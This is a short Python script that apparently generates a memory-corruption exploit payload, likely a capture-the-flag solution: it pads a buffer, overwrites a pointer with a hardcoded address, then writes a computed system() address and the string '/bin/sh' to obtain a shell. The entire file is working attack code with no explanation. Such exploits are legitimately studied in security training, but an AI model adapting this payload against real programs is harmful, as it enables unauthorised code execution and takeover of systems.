import sys
import struct
#from pwn import *


pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755030)
s1 = pad + read_addr + "\n"

strlen = 0x7ffff7e7d710


# step 2 arbitrary writing
system = struct.pack("<Q", strlen-0x43720)
s2 = system + "\n" + "/bin/sh\n"

sys.stdout.write(s1 + s2)
